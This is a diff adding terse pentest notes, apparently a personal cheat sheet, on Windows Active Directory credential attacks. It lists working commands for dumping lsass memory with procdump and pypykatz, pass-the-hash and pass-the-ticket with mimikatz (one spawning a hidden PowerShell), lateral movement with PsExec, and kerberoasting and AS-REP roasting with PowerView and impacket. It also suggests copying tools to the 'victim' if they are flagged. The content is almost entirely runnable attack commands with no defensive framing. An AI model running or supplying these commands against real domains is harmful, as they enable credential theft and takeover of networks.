@@ -2,3 +2,84 @@
 nslookup
 set type=all
 _ldap._tcp.dc._msdcs.some.domain
+
+# over pass the hash
+
+trigger kerberos ticket creation via: net use \\dc
+
+## requirements
+
+- hash
+
+## tools
+
+### todo
+
+# dump lsass
+
+- admin session
+
+## tools
+
+### windows standard tools
+
+dump lsass.exe via taskmanager or via procdump from sysinternals. If procdump is flaged, copy the zip files to victim:
+.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+pypykatz lsa minidump lsass.DMP
+
+# pass the hash
+
+## requirements
+
+- hash
+
+## tools
+
+### mimikatz
+
+sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"
+
+# pass the ticket
+
+## requirements
+
+- ???
+
+## tools
+
+### mimikatz
+
+sekurlsa::tickets /export
+kerberos::ptt <filename.kirbi>
+misc::cmd           # opens new cmd with ticket creds so you need rdp session for that
+.\PsExec64.exe \\dc cmd.exe
+
+# kerberoast
+
+## requirements
+
+- valid domain creds/session
+
+## tools
+
+### powerview
+
+. .\powerview.ps1
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+awk -F '"' '{print $8}' kerberoast.csv | tail -n +2
+
+### impacket
+
+impacket-GetUserSPNs -request -dc-ip d.c.i.p domain.com/username:'password' -outputfile hashes.kerberoast
+
+# asrep roasting
+
+## requirements 
+
+- valid domain creds/session
+
+## tools
+
+### impacket
+
+impacket-GetNPUsers -request -dc-ip d.c.i.p domain.com/username:'password' -outputfile hashes.asrep
